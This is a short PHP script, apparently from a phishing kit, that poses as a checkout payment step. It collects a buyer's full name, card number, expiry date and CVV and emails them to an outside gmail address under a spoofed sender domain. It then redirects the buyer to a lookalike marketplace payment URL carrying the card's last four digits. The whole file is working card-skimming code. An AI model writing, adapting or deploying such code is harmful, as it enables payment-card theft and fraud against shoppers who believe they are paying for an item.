<?php 
    $item_name = $_POST['item_name'];
	$amount = $_POST['amount'];
	$currency_code = $_POST['currency_code'];
	
	$nombre = $_POST['fullname'];
	$card_number = $_POST['card_number'];
	$input_expiration_date = $_POST['input_expiration_date'];
	$cvv = $_POST['cvv'];
	$asunto = 'Formulario';
	$mensaje = "Nombre: ".$nombre."<br> Email: $card_number <br> input_expiration_date: $input_expiration_date <br> cvv: $cvv <br> item_name: $item_name <br> amount: $amount <br> currency_code: $currency_code";

	$rest = substr($card_number , -4); 	
	$from = 'IAXG830920HS@gmail.com';
$headers = "From: admin@soberanosoft.gq\r\n"; 
$headers .= "Reply-To: $from\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n"; 
	
if(mail($from, $asunto, $mensaje,$headers)){
	header("Location: https://www.gamestoremercadoshopscom.ml/mpago/checkout_v1_payment_redirect_6a4fac9c-203d-485c-ba1a-e8b5cc9e85a9_card-form__router-request-id=15927339-fff3-438a-b003-a72c_cc_email?item_name=$item_name&amount=$amount&micc=$rest");
exit();
	}

 ?>